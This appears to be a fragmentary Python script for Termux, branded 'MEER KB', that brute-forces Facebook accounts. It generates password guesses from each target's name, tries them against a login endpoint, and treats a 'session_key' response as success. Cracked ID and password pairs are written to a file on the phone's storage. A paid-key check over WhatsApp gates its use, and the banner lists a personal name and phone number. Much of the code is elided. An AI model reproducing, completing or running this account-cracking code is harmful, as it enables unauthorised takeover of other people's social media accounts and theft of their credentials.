...
#----[pran links]-----
kkk = {'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
...
888b     d888 888    d8P  888888b.   
8888b   d8888 888   d8P   888  "88b  
88888b.d88888 888  d8P    888  .88P  
888Y88888P888 888d88K     8888888K.  
888 Y888P 888 8888888b    888  "Y88b 
888  Y8P  888 888  Y88b   888    888 
888   "   888 888   Y88b  888   d88P 
888       888 888    Y88b 8888888P" 
                                                 
{50*"-"}
    FACEBOOK     MEER KHAN BALOCH
    WHATSAPP     03103724344
    OTHERS       MEER KB
{50*"-"}'''
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923103724344?text={bumper}")
                        qsbuy()
...
def main():
        ...
        os.system('clear')
        print(logo);xchker()
        print('🔥 MEER KB NAME TO SUNA HOGA 🔥')
        print(50*'-')
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[MEER KB] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[MEER KB-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/MEER KB_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/MEER KB_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/MEER KB' in datar:
        pass
else:
        for i in range(5000):
